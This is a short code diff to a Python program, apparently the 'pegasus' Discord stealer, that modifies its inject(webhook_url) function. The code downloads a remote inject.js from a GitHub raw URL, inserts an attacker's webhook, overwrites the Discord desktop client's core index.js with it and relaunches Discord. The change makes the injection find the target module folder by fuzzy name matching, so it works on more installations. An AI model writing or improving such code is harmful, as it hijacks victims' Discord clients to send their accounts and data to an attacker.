@@ -1,4 +1,5 @@
 import base64
+import difflib
 import json
 import os
 import winreg
@@ -457,7 +458,8 @@ def inject(webhook_url):
                 if match(r'app-(\d*\.\d*)*', __dir):
                     abspath = os.path.abspath(appdata+os.sep+_dir+os.sep+__dir) 
                     f = requests.get("https://raw.githubusercontent.com/addi00000/pegasus/main/inject.js").text.replace("%WEBHOOK%", webhook_url)
-                    with open(abspath+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
+                    modules_dir = os.listdir(abspath+'\\modules') 
+                    with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
                         indexFile.write(f)
                     os.startfile(abspath+os.sep+_dir+'.exe')
 
